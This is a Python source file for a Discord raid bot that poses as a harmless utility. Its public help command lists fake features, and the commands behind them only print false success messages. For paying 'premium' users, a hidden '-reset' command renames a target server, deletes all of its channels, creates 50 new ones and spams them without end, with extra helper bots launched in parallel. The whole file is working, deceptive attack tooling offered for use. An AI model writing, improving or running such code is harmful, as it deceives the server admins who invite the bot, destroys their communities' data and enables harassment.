import sys
import subprocess
import random
import asyncio
import os
import json
from multiprocessing import Process

try:
    import discord
    from discord.ext import commands
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py"])
    import discord
    from discord.ext import commands

MAIN_BOT_TOKEN = 'ur bot token'
HELPER_TOKENS = [
    'helper bot token',
    'helper bot token',
    'helper bot token'
]
HELPER_INVITES = [
    'helper bot invite',
    'helper bot invite',
    'helper bot invite'
]

# Server configuration and premium role
YOUR_SERVER_ID = 1432950742959919156  # ur server id
PREMIUM_ROLE_ID = 1432961570761347072  # role in ur server (who can use bot)
CONFIG_DIR = "user_configs"

def get_user_config_path(user_id):
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)
    return os.path.join(CONFIG_DIR, f"{user_id}_config.json")

def load_config(user_id):
    config_path = get_user_config_path(user_id)
    if os.path.exists(config_path):
        with open(config_path, "r", encoding="utf-8") as f:
            return json.load(f)
    return None

def save_config(user_id, config):
    config_path = get_user_config_path(user_id)
    with open(config_path, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2)

def run_spam_bot(token, target_guild_id):
    intents = discord.Intents.default()
    intents.guilds = True
    intents.messages = True
    intents.message_content = True

    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user} connected and ready to spam.')

        guild = bot.get_guild(target_guild_id)
        if not guild:
            print(f"{bot.user} not in the target guild {target_guild_id}!")
            return

        with open("messages_to_spam.txt", "r", encoding="utf-8") as f:
            messages = [line.strip() for line in f if line.strip()]

        channels = [ch for ch in guild.text_channels]
        print(f'{bot.user} found {len(channels)} channels in guild {target_guild_id}.')

        async def spam_channel(channel):
            while True:
                try:
                    await channel.send(random.choice(messages))
                except Exception as e:
                    print(f"Error in {channel.name}: {e}")
                await asyncio.sleep(1)

        await asyncio.gather(*(spam_channel(ch) for ch in channels))

    bot.run(token)

async def check_premium(ctx):
    """Checks if user has premium role on your server"""
    try:
        # Get the server
        guild = ctx.bot.get_guild(YOUR_SERVER_ID)
        if not guild:
            await ctx.author.send("❌ Bot cannot find the main server.")
            return False
        
        # Get user on the server
        member = guild.get_member(ctx.author.id)
        if not member:
            await ctx.author.send("❌ You are not on the bot's main server.")
            return False
        
        # Check premium role
        premium_role = guild.get_role(PREMIUM_ROLE_ID)
        if not premium_role:
            await ctx.author.send("❌ Premium role not found.")
            return False
        
        return premium_role in member.roles
    except Exception as e:
        print(f"Error checking premium: {e}")
        return False

def run_main_bot():
    intents = discord.Intents.default()
    intents.guilds = True
    intents.guild_messages = True
    intents.messages = True
    intents.members = True
    intents.message_content = True

    bot = commands.Bot(command_prefix='-', intents=intents)

    @bot.event
    async def on_ready():
        print(f'Main bot connected as {bot.user}')

    # Fake help command
    @bot.command()
    async def nova_help(ctx):
        """Fake help command with fake commands"""
        embed = discord.Embed(
            title="🤖 Bot Commands",
            description="Here are all available commands:",
            color=0x00ff00
        )
        embed.add_field(
            name="🎤 -createvc [name]",
            value="Create a voice channel with specified name",
            inline=False
        )
        embed.add_field(
            name="👥 -addrole [user] [role]",
            value="Add a role to specified user",
            inline=False
        )
        embed.add_field(
            name="🔄 -reset",
            value="Reset server settings to default",
            inline=False
        )

        await ctx.send(embed=embed)

    # Real help command
    @bot.command()
    async def nhelp(ctx):
        """Real help command with actual functionality"""
        if not await check_premium(ctx):
            return
        
        embed = discord.Embed(
            title="🔒 Premium Commands",
            description="These commands are available for premium users only:",
            color=0xff9900
        )
        embed.add_field(
            name="⚙️ -setup",
            value="Configure your server raid settings (server name, channels, messages)",
            inline=False
        )
        embed.add_field(
            name="💥 -reset",
            value="Execute the raid on target server (renames server, deletes channels, spams messages)",
            inline=False
        )
        await ctx.author.send(embed=embed)

    # Fake commands
    @bot.command()
    async def createvc(ctx, *, name):
        """Fake create voice channel command"""
        embed = discord.Embed(
            title="✅ Success",
            description=f"Voice channel `{name}` created successfully!",
            color=0x00ff00
        )
        await ctx.send(embed=embed)

    @bot.command()
    async def addrole(ctx, member: discord.Member, *, role_name):
        """Fake add role command"""
        embed = discord.Embed(
            title="✅ Success",
            description=f"Role `{role_name}` added to {member.mention}!",
            color=0x00ff00
        )
        await ctx.send(embed=embed)

    @bot.command()
    async def setup(ctx):
        """Setup command for raid configuration"""
        if not await check_premium(ctx):
            return

        def check_dm(m):
            return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

        await ctx.author.send("What new server name?")
        server_name_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        new_server_name = server_name_msg.content.strip()

        await ctx.author.send("Channel names? (Separate with `|`)")
        channels_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        channel_names = [x.strip() for x in channels_msg.content.split('|')]

        await ctx.author.send("Messages to spam? (Separate with `|`)")
        messages_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        messages = [x.strip() for x in messages_msg.content.split('|')]

        config = {
            "server_name": new_server_name,
            "channel_names": channel_names,
            "messages": messages
        }
        save_config(ctx.author.id, config)

        await ctx.author.send("✅ Your setup has been saved. You can now use `-reset`.")

    @bot.command()
    async def reset(ctx):
        """Main raid command (replaces -echofy)"""
        if not await check_premium(ctx):
            return

        def check_dm(m):
            return m.author == ctx.author and isinstance(m.channel, discord.DMChannel)

        config = load_config(ctx.author.id)
        if not config:
            await ctx.author.send("⚠️ No setup found. Run `-setup` first.")
            return

        await ctx.author.send("Send the **guild ID**:")
        guild_id_msg = await bot.wait_for('message', check=check_dm, timeout=300)
        try:
            target_guild_id = int(guild_id_msg.content.strip())
        except ValueError:
            await ctx.author.send("❌ Invalid guild ID.")
            return

        guild = bot.get_guild(target_guild_id)
        if not guild:
            await ctx.author.send("❌ I am not in that server.")
            return

        await ctx.author.send("Do you want to use **helper bots**? (`yes` or `no`)")
        helper_choice_msg = await bot.wait_for('message', check=check_dm, timeout=120)
        use_helpers = helper_choice_msg.content.strip().lower() == "yes"

        if use_helpers:
            await ctx.author.send("Add these helper bots to the server:")
            for link in HELPER_INVITES:
                await ctx.author.send(link)
            await ctx.author.send("Reply `done` once all bots are added.")

            done_msg = await bot.wait_for('message', check=check_dm, timeout=300)
            if done_msg.content.lower() != 'done':
                await ctx.author.send("Setup cancelled.")
                return

        await ctx.author.send(f"Renaming server to **{config['server_name']}**...")
        await guild.edit(name=config["server_name"])

        await ctx.author.send("Deleting all channels...")
        await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)

        total_channels = 50
        channel_list = [config["channel_names"][i % len(config["channel_names"])] for i in range(total_channels)]
        new_channels = await asyncio.gather(*(guild.create_text_channel(name) for name in channel_list), return_exceptions=True)
        new_channels = [ch for ch in new_channels if isinstance(ch, discord.TextChannel)]

        if use_helpers:
            with open("messages_to_spam.txt", "w", encoding="utf-8") as f:
                for msg in config["messages"]:
                    f.write(msg + "\n")

            helper_processes = [Process(target=run_spam_bot, args=(token, target_guild_id)) for token in HELPER_TOKENS]
            for p in helper_processes:
                p.start()

            await ctx.author.send("🚀 Infinite spam with helper bots started...")

            async def spam_channel(channel):
                while True:
                    try:
                        await channel.send(random.choice(config["messages"]))
                    except Exception as e:
                        print(f"Error in {channel.name}: {e}")
                    await asyncio.sleep(1)

            await asyncio.gather(*(spam_channel(ch) for ch in new_channels))

        else:
            await ctx.author.send(f"Created {len(new_channels)} channels. Sending 30 messages per channel...")

            async def spam_limited(channel):
                for _ in range(30):
                    try:
                        await channel.send(random.choice(config["messages"]))
                    except Exception as e:
                        print(f"Error in {channel.name}: {e}")
                    await asyncio.sleep(1)

            await asyncio.gather(*(spam_limited(ch) for ch in new_channels))
            await ctx.author.send("✅ Finished sending messages (no helper bots).")

    bot.run(MAIN_BOT_TOKEN)

if __name__ == "__main__":
    run_main_bot()